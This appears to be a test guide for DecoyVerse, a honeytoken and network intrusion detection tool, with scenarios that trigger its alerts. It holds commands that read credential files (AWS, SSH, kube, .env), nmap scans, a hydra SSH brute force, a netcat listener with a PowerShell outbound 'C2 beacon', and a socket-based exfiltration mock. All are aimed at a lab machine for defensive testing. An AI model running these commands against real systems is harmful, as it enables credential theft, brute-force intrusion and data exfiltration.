# DecoyVerse — Test Cases & Attack Simulation Guide

This document covers how to verify that every detection layer works end-to-end.
Each scenario lists: **goal → setup → attack command → expected result**.

---

## Prerequisites

| Item | Requirement |
|------|-------------|
| Agent machine | Windows 10/11 (primary target) or Linux |
| Attacker machine | Kali Linux VM, separate laptop, or WSL2 |
| Backend | FastAPI running on `:8001` |
| Frontend | React app running on `:5173` (or deployed URL) |
| Agent running | `python agent.py` with a valid node registered |

---

## 1. Quick Smoke Test (5 minutes)

Verifies the core alert pipeline works before deeper testing.

### Steps
```
1. Register an account → create a node → download and run the agent
2. Wait for agent to deploy honeytokens (look for "Honeytokens deployed" in agent output)
3. Open Windows Explorer → navigate to one of these paths:
      %USERPROFILE%\Documents\
      %USERPROFILE%\.aws\
      %USERPROFILE%\Downloads\
4. Find any file matching: aws_credentials*, password*, secrets*, db_config*
5. Double-click to open it (Notepad will open)
6. Switch to the DecoyVerse dashboard
```

### Expected Result
- Alert appears in "Recent Alerts" within 30 seconds
- Severity: `CRITICAL` (for AWS/credentials files) or `HIGH`
- Attack type: `HONEYTOKEN_ACCESS`
- Risk score: 8–10
- Notification sent to configured channels (email, Slack, WhatsApp)

---

## 2. Honeytoken Trigger Scenarios

### 2.1 AWS Credentials File Access
**Goal:** Detect read access to fake AWS keys

```powershell
# On the agent machine (Windows)
type $env:USERPROFILE\.aws\credentials
# or
notepad $env:USERPROFILE\.aws\credentials
```
**Expected:** CRITICAL alert — `attack_type: CREDENTIAL_THEFT`, `risk_score: 9-10`

---

### 2.2 SSH Private Key Access
**Goal:** Detect exfiltration of SSH keys

```powershell
# Windows
type $env:USERPROFILE\.ssh\id_rsa

# Linux
cat ~/.ssh/id_rsa
```
**Expected:** CRITICAL alert — `attack_type: CREDENTIAL_THEFT`, `risk_score: 9`

---

### 2.3 Database Backup / SQL Dump Access
**Goal:** Detect access to fake database exports

```powershell
# Windows
type $env:USERPROFILE\Documents\db_backup_2024.sql
```
**Expected:** HIGH alert — `attack_type: DATA_EXFILTRATION`, `risk_score: 7-8`

---

### 2.4 .env Config File Read
**Goal:** Detect reading of application secrets

```bash
# Linux / WSL
cat ~/.env
cat ~/app/.env
```
**Expected:** HIGH alert — `attack_type: CREDENTIAL_THEFT`, `risk_score: 7`

---

### 2.5 Kubernetes Config Access
**Goal:** Detect cloud infrastructure credential theft

```powershell
# Windows
type $env:USERPROFILE\.kube\config
```
**Expected:** CRITICAL alert — `attack_type: LATERAL_MOVEMENT`, `risk_score: 9`

---

### 2.6 File Modification (Highest Severity)
**Goal:** Verify MODIFIED events score higher than ACCESSED

```powershell
# Windows PowerShell
Add-Content "$env:USERPROFILE\.aws\credentials" "# tampered"
```
**Expected:** Risk score elevated by ~1 point vs. simple read. `action: MODIFIED`

---

## 3. Network Alert Simulation (Laptop-to-Laptop)

### Lab Setup

```
┌─────────────────────────┐     LAN / same WiFi     ┌─────────────────────────┐
│  Attacker (Kali Linux)  │ ───────────────────────▶ │  Victim (Windows Agent) │
│  IP: 192.168.1.10       │                          │  IP: 192.168.1.50       │
│                         │                          │  Agent running          │
└─────────────────────────┘                          └─────────────────────────┘
```

Both machines must be on the same subnet, or use a host-only VMware/VirtualBox network.

---

### 3.1 Port Scan Detection

**Tools needed:** `nmap` (pre-installed on Kali)

```bash
# Basic TCP SYN scan from attacker
nmap -sS -p 1-1024 192.168.1.50

# Aggressive scan (triggers more rule hits)
nmap -A -T4 192.168.1.50

# Specific high-value port scan
nmap -p 22,3306,5432,6379,27017,8080,8443 192.168.1.50
```

**Expected:** Network alert with `attack_type: PORT_SCAN`, `rule_triggers: ["port_scan"]`, `risk_score: 5-7`

---

### 3.2 SSH Brute Force Simulation

**Tools needed:** `hydra` (Kali), or `medusa`

```bash
# Hydra SSH brute force (victim must have SSH running, even if fake/blocked)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50

# Lighter version (fewer attempts, faster result)
hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 ssh://192.168.1.50
```

**Expected:** HIGH alert — `attack_type: BRUTE_FORCE`, multiple connection events, `risk_score: 7-8`

> **Note:** The victim machine doesn't need SSH enabled. The agent's NetworkMonitor tracks outbound + inbound connection patterns via psutil, so even refused connections appear in logs.

---

### 3.3 Reverse Shell Detection

**Goal:** Detect attacker establishing a C2 connection outbound from victim

```bash
# Attacker machine — start listener
nc -lvnp 4444

# Victim machine (Windows PowerShell) — simulate outbound C2 beacon
$client = New-Object System.Net.Sockets.TcpClient("192.168.1.10", 4444)
$client.Close()
```

**Expected:** Network alert with `dest_port: 4444`, `rule_triggers: ["rare_port", "non_local_dest"]`

---

### 3.4 Data Exfiltration Simulation (Large Transfer)

```bash
# Victim machine — simulate large outbound transfer (Python)
python -c "
import socket, time
s = socket.socket()
s.connect(('192.168.1.10', 9999))
s.send(b'A' * 1_000_000)  # 1MB
s.close()
"
```

**Expected:** Network alert with `attack_type: DATA_EXFILTRATION`, high `rule_score`

---

## 4. IP Blocking Test

**Goal:** Verify the IP block workflow reaches the agent and applies

```
1. Trigger an alert (use any scenario above)
2. Open the alert in the dashboard (click the alert row)
3. Click "Block Source IP" in the ThreatModal
4. Wait up to 30 seconds (next heartbeat)
5. On Windows agent machine, run: netsh advfirewall firewall show rule name="DecoyVerse_Block_*"
```

**Expected:** A Windows Firewall rule named `DecoyVerse_Block_<IP>` appears with action `BLOCK`.

---

## 5. Alert Notification Channels

### 5.1 Email Test
```
Settings → Alert Channels → enter email → Save → click "Send Test Alert"
```
Expected: Receive email within 60 seconds matching the ThreatModal design.

### 5.2 Slack Test
```
1. Create a Slack Incoming Webhook at https://api.slack.com/apps
2. Paste webhook URL in Settings → Alert Channels → Slack
3. Trigger any honeytoken access (Section 2)
```
Expected: Slack message in configured channel within 30 seconds.

### 5.3 WhatsApp Test
```
1. Create Twilio Sandbox account at https://www.twilio.com/console/sms/whatsapp/sandbox
2. Add TWILIO_* env vars to ML-modle v0/backend/.env
3. Enter your WhatsApp number in Settings → Alert Channels
4. Trigger any honeytoken access
```
Expected: WhatsApp message from the Twilio Sandbox number.

---

## 6. Agent Deployment & Uninstall Test

### 6.1 Verify Decoy Deployment
```
1. Create node in dashboard with 3 decoys, 5 honeytokens
2. Run agent — check output for "Honeytokens deployed successfully"
3. Open File Explorer → check Documents, .aws, .ssh, Downloads for deployed files
4. Check dashboard Nodes page → node status = Active
```

### 6.2 Remote Uninstall via Dashboard
```
1. Dashboard → Nodes → click Delete on a running node
2. Confirm deletion in the modal
3. Within 30 seconds, the agent receives the signal and self-destructs
4. Verify all honeytoken files are gone from Documents, .aws, .ssh, etc.
5. Node disappears from dashboard
```

### 6.3 Manual Uninstall (Offline Agent)
```
1. Kill the agent process (Ctrl+C or Task Manager)
2. Follow PowerShell commands in the dashboard Delete modal
3. Verify: schtasks /Query /TN DecoyVerseAgent → shows "ERROR: The specified task name..."
4. Verify: honeytoken files in Documents/.aws/.ssh are gone
5. Click Delete Node in dashboard to remove the DB record
```

---

## 7. Severity Classification Reference

| Condition | Expected `risk_score` | `severity` |
|-----------|----------------------|------------|
| Honeytoken ACCESSED (credential file) | 9–10 | critical |
| Honeytoken MODIFIED | 9–10 | critical |
| SSH/credential file opened | 8–9 | critical |
| Database backup accessed | 7–8 | high |
| .env / config file opened | 7 | high |
| Port scan detected | 5–7 | medium |
| Brute force (SSH/FTP) | 7–8 | high |
| Rare outbound port connection | 4–6 | medium |
| Normal config file accessed | 2–4 | low |

---

## 8. Recommended Attack Lab Tools

| Tool | Platform | Purpose |
|------|----------|---------|
| `nmap` | Kali / any | Port scanning |
| `hydra` | Kali | Brute force (SSH, FTP, HTTP) |
| `medusa` | Kali | Brute force alternative |
| `netcat` / `nc` | All | Reverse shells, raw TCP |
| Metasploit (`msfconsole`) | Kali | Full exploitation framework |
| `curl` / `wget` | All | HTTP request simulation |
| Burp Suite | Win/Mac/Linux | Web application attacks |
| Wireshark | Win/Mac/Linux | Packet capture verification |
| Python `socket` | All | Custom traffic simulation |

### Recommended Vulnerable VMs (for victim role)
- **Metasploitable 2/3** — intentionally vulnerable Linux
- **DVWA** (Damn Vulnerable Web Application) — web attack practice
- **Windows 10 VM** with DecoyVerse agent (primary target for honeytoken tests)
- **VulnHub** VMs — various CVE-based targets

---

## 9. Troubleshooting

| Symptom | Check |
|---------|-------|
| Alert not appearing after file access | Agent polling interval (default 5s). Wait 10s. Check agent console for "Detected ACCESSED" |
| `attack_type: Unknown` in dashboard | `normalizeAlert()` mapping — check `dashboard.ts` |
| Network alerts not firing | `psutil` installed? Run `python -c "import psutil"` on agent machine |
| Email not delivered | SMTP credentials in backend `.env`? Check `SMTP_USER`, `SMTP_PASS` |
| IP block not applied | `dv_firewall.py` running as SYSTEM? Check Scheduled Task `DecoyVerseFirewall` |
| Agent not starting | `requirements.txt` dependencies installed? Run `pip install -r requirements.txt` |
